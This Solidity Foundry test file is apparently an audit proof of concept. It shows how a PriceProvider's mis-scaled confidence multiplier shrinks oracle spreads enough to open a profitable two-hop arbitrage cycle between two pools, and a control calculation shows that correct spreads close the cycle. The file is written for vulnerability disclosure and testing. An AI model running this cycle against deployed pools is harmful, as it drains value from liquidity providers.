// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {PriceProvider} from "../contracts/PriceProvider.sol";
import {IOffchainOracle} from "../contracts/interfaces/IOffchainOracle.sol";

/// @dev Minimal open oracle that uses the production `price(feedId, pool)` return units.
contract MultiFeedSpreadOracle {
    struct Feed {
        uint256 mid;
        uint256 spreadBps;
        uint256 refTime;
    }

    mapping(bytes32 => Feed) internal feeds;

    function setFeed(bytes32 feedId, uint256 mid, uint256 spreadBps, uint256 refTime) external {
        feeds[feedId] = Feed(mid, spreadBps, refTime);
    }

    function price(bytes32 feedId, address)
        external
        view
        returns (uint256 mid, uint256 spread, uint16 spread1, uint256 refTime)
    {
        Feed memory feed = feeds[feedId];
        return (feed.mid, feed.spreadBps, 0, feed.refTime);
    }

    function priceGuard(bytes32) external pure returns (uint128 min, uint128 max) {
        return (0, 0);
    }
}

/// @notice Demonstrates how two individually valid feed bands become a cyclic arbitrage after
///         PriceProvider applies its confidence multiplier 100x below the documented scale.
contract PriceProviderSpreadUnitsMultiFeedPoC is Test {
    uint256 internal constant Q64 = 1 << 64;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant ORACLE_DECIMALS = 1e8;

    bytes32 internal constant LOW_FEED = keccak256("ASSET/QUOTE source A");
    bytes32 internal constant HIGH_FEED = keccak256("ASSET/QUOTE source B");

    uint256 internal constant LOW_MID = 100 * ORACLE_DECIMALS;
    uint256 internal constant HIGH_MID = 104 * ORACLE_DECIMALS;
    uint256 internal constant REPORTED_SPREAD_BPS = 500; // 5% confidence half-width.
    uint256 internal constant OPERATIONAL_DEFAULT = 300_000;
    int256 internal constant EXTRA_MARGIN_E18 = 1e15; // An additional, nonzero 10 bps per side.

    address internal constant BASE_TOKEN = address(0xBEEF);
    address internal constant QUOTE_TOKEN = address(0xCAFE);

    MultiFeedSpreadOracle internal oracle;
    PriceProvider internal lowProvider;
    PriceProvider internal highProvider;

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle = new MultiFeedSpreadOracle();

        lowProvider = _deployProvider(LOW_FEED);
        highProvider = _deployProvider(HIGH_FEED);

        // Both observations are fresh. Their stated 5% bands overlap, so a true price in the
        // overlap is compatible with both observations; no stale or forged oracle value is needed.
        oracle.setFeed(LOW_FEED, LOW_MID, REPORTED_SPREAD_BPS, block.timestamp);
        oracle.setFeed(HIGH_FEED, HIGH_MID, REPORTED_SPREAD_BPS, block.timestamp);

        // SetMagic.s.sol applies 300,000 to every provider by default. Given the documented
        // 10,000 multiplier base, that is nominally 30x; the implementation applies only 0.3x.
        lowProvider.setConfidenceParam(OPERATIONAL_DEFAULT);
        highProvider.setConfidenceParam(OPERATIONAL_DEFAULT);
    }

    function test_freshOverlappingFeedBandsBecomeProfitableCycle() public {
        (uint128 lowBid, uint128 lowAsk) = lowProvider.getBidAndAskPrice();
        (uint128 highBid, uint128 highAsk) = highProvider.getBidAndAskPrice();

        uint256 lowMidX64 = Math.mulDiv(LOW_MID, Q64, ORACLE_DECIMALS);
        uint256 highMidX64 = Math.mulDiv(HIGH_MID, Q64, ORACLE_DECIMALS);
        uint256 lowAskHalfWidthBps = Math.mulDiv(uint256(lowAsk) - lowMidX64, BPS, lowMidX64);
        uint256 highBidHalfWidthBps = Math.mulDiv(highMidX64 - uint256(highBid), BPS, highMidX64);

        emit log_string("--- Fresh oracle observations ---");
        emit log_named_decimal_uint("source A midpoint", LOW_MID, 8);
        emit log_named_decimal_uint("source B midpoint", HIGH_MID, 8);
        emit log_named_uint("reported confidence half-width (bps)", REPORTED_SPREAD_BPS);
        emit log_named_uint("extra configured margin per side (bps)", 10);

        emit log_string("--- Quotes returned by production PriceProvider ---");
        emit log_named_decimal_uint("source A bid", _x64ToWad(lowBid), 18);
        emit log_named_decimal_uint("source A ask", _x64ToWad(lowAsk), 18);
        emit log_named_decimal_uint("source B bid", _x64ToWad(highBid), 18);
        emit log_named_decimal_uint("source B ask", _x64ToWad(highAsk), 18);
        emit log_named_uint("effective A ask half-width (bps)", lowAskHalfWidthBps);
        emit log_named_uint("effective B bid half-width (bps)", highBidHalfWidthBps);

        // At the nominal 30x setting, the quote should be at least as wide as the raw 500 bps
        // band. Instead, spread * 300,000 / 1e10 is 1.5%, leaving about 160 bps with margin.
        assertLt(lowAskHalfWidthBps, 200, "500 bps oracle spread was compressed below 200 bps");
        assertLt(highBidHalfWidthBps, 200, "500 bps oracle spread was compressed below 200 bps");

        // Model the two-hop route QUOTE -> BASE in the low-price pool, then BASE -> QUOTE
        // in the high-price pool. These are exactly the ask and bid consumed by MetricOmmPool.
        uint256 quoteIn = 1_000e18;
        uint256 baseOut = Math.mulDiv(quoteIn, Q64, lowAsk);
        uint256 quoteOut = Math.mulDiv(baseOut, highBid, Q64);
        uint256 profit = quoteOut - quoteIn;
        uint256 profitBps = Math.mulDiv(profit, BPS, quoteIn);

        // Correctly preserving the whole-bps confidence spread closes the same cycle.
        uint256 correctLowAskX64 = _correctAskX64(LOW_MID);
        uint256 correctHighBidX64 = _correctBidX64(HIGH_MID);
        uint256 controlBaseOut = Math.mulDiv(quoteIn, Q64, correctLowAskX64);
        uint256 controlQuoteOut = Math.mulDiv(controlBaseOut, correctHighBidX64, Q64);

        emit log_string("--- Two-hop cyclic route ---");
        emit log_named_decimal_uint("starting quote amount", quoteIn, 18);
        emit log_named_decimal_uint("ending quote amount with production providers", quoteOut, 18);
        emit log_named_decimal_uint("permissionless cycle profit", profit, 18);
        emit log_named_uint("cycle profit (bps)", profitBps);
        emit log_named_decimal_uint("ending quote amount with full oracle spreads", controlQuoteOut, 18);

        assertGt(quoteOut, quoteIn, "compressed spreads expose a profitable cycle");
        assertGt(profitBps, 50, "single cycle extracts more than 50 bps of traded principal");
        assertLt(controlQuoteOut, quoteIn, "the reported 5% bands correctly close the cycle");
    }

    function _deployProvider(bytes32 feedId) internal returns (PriceProvider provider) {
        provider = new PriceProvider(
            address(this), address(oracle), feedId, EXTRA_MARGIN_E18, 1 days, BASE_TOKEN, QUOTE_TOKEN
        );
    }

    function _correctAskX64(uint256 mid) internal pure returns (uint256) {
        uint256 spreadFactorE18 = REPORTED_SPREAD_BPS * 1e14;
        return Math.mulDiv(
            mid,
            Q64 * (1e18 + spreadFactorE18) * uint256(1e18 + EXTRA_MARGIN_E18),
            ORACLE_DECIMALS * 1e36,
            Math.Rounding.Ceil
        );
    }

    function _correctBidX64(uint256 mid) internal pure returns (uint256) {
        uint256 spreadFactorE18 = REPORTED_SPREAD_BPS * 1e14;
        return Math.mulDiv(
            mid,
            Q64 * (1e18 - spreadFactorE18) * uint256(1e18 - EXTRA_MARGIN_E18),
            ORACLE_DECIMALS * 1e36,
            Math.Rounding.Floor
        );
    }

    function _x64ToWad(uint256 priceX64) internal pure returns (uint256) {
        return Math.mulDiv(priceX64, 1e18, Q64);
    }
}
